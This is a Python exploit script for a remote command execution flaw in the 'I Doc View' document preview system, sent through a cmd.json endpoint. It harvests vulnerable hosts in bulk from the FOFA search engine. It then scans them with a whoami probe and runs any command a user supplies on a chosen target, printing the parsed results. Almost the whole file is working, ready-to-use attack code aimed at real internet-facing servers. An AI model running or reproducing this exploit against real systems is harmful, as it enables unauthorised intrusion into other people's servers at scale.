#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import random
import json
import re
import argparse
import html
from tqdm import tqdm
from urllib.parse import unquote

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = {'User-Agent': random_user_agent}
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=your fofa email&key=your fofa api key&qbase64=dGl0bGU9PSLlnKjnur/mlofmoaPpooTop4ggLSBJIERvYyBWaWV3Ig%3D%3D&size=9999" # title=="在线文档预览 - I Doc View",自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def Single_objective_testing(url): # 单目标检测
    url = url + "/system/cmd.json?cmd=whoami"
    header = UA()
    try:
        rqg = requests.get(url, headers=header, verify=False, allow_redirects=False, timeout=2)

        if rqg.status_code != 200:
            msg = "{} has no vulnerabilities".format(url)
            return False, msg
        else:
            msg = "{} has vulnerabilities".format(url)
            return True, msg
    except requests.Timeout:
        msg = "{} timed out ({} seconds)".format(url, 2)
        return False, msg
    except Exception as e:
        msg = "{} encountered an error: {}".format(url, str(e))
        return False, msg

def Multi_objective_testing(file): # 多目标检查
    with open(file, "r") as f:
        lines = f.readlines()
        for url in tqdm(lines, desc="Checking Progress", position=0, leave=False, ncols=80):
            url = url.strip()
            if "https" not in url:
                flag, msg = Single_objective_testing(url)
                if flag:
                    tqdm.write(msg)  # 使用 tqdm.write 输出，不打断 tqdm 进度条

def RCE(url, cmd): # 漏洞利用 RCE
    url = url + "/system/cmd.json?cmd=" + cmd
    header = UA()
    try:
        rqg = requests.get(url, headers=header, verify=False, allow_redirects=False, timeout=2)

        if rqg.status_code == 200:
            respBody = rqg.text
            respBody = json.loads(respBody)
            if "data" in respBody:
                formatted_data = json.dumps(unquote(html.unescape(respBody["data"])), indent=4, ensure_ascii=False)
                print("网页返回内容:\n" + formatted_data.replace("<br />","\n"))
                result = re.search(r"\;<br />.*<br />&", str(respBody["data"]), re.I)
                if result and result.group(0):
                    result = result.group(0).replace(";<br />", "").replace("<br />&", "")
                    if "<br />" in result:
                        msg = "执行结果： " + str(unquote(html.unescape(result)).replace("<br />","\n"))
                    else:
                        msg = "执行结果： " + str(result)
                    return msg

    except Exception as e:
        msg = "{} encountered an error: {}".format(url, str(e))
        return msg

def main():
    parser = argparse.ArgumentParser(description="### I Doc View Online Document Preview System cmd.json has RCE vulnerability. ###")

    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -u http://xxx.xxx.xxx")
    parser.add_argument("-c", "--rce", nargs=2, metavar=("URL", "CMD"), help="Perform RCE. e.g:python i_Doc_View_cmd_json-RCE.py -c http://xxx.xxx.xxx whoami")

    args = parser.parse_args()

    if args.target_collection:
        Target_collection("./url.txt")
    elif args.multi_objective_testing:
        Multi_objective_testing(args.multi_objective_testing)
    elif args.single_objective_testing:
        flag, msg = Single_objective_testing(args.single_objective_testing)
        if flag:
            print(msg)
    elif args.rce:
        url, cmd = args.rce
        result = RCE(url, cmd)
        print(result)
    else:
        print("No valid options provided. Use -h for help.")

if __name__ == "__main__":
    main()
